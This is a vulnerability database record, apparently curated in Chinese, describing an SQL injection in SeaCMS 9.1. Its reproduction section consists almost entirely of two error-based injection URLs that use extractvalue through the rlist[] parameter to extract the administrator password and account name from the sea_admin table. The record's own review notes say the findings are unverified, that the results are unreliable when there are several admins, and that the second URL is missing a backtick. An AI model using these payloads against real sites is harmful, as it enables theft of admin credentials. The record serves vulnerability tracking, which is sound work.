---
source: "hatch 补库批 20260928"
product: "SeaCMS9.1"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Seacms V9.1 版本SQL注入"
prerequisites: "来源所述条件，未列明部分仍待核：rlist数组进入SQL、DB支持extractvalue显错；sea_admin固定表名"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-ca9c3920e1e05d22a39d45b0"
entity_id: "ve-ca9c3920e1e05d22a39d45b0"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：rlist数组进入SQL、DB支持extractvalue显错；sea_admin固定表名

- **结论使用边界（1）**：声称第一个用户但子查询无LIMIT，在多个管理员时可能多行报错，提取结果不可靠。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：第二URL少结尾反引号；没有源码/响应/出处，密码实际字段哈希未区分。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Seacms V9.1 版本SQL注入

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

获取管理员表中第一个用户的密码

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27`

获取管理员表中第一个用户的账号

    http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27
